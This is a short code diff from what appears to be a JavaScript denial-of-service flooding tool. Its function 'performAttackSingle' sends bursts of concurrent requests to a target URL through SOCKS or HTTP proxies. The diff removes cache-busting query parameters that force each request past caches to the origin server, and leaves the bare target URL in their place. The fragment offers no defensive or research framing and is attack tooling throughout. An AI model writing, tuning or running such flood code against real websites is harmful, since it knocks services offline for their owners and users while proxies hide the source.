@@ -737,9 +737,7 @@ const performAttackSingle = async (target, ctx, threadId) => {
     const startTime = Date.now();
     const promises = [];
     for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
-      const cb = generateCacheBuster();
-      const sep = target.url.includes("?") ? "&" : "?";
-      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
+      const url = target.url;
       if (ctx.type === "socks") {
         promises.push(socksRequest(url, ctx.agent, threadId));
       } else if (ctx.type === "http") {
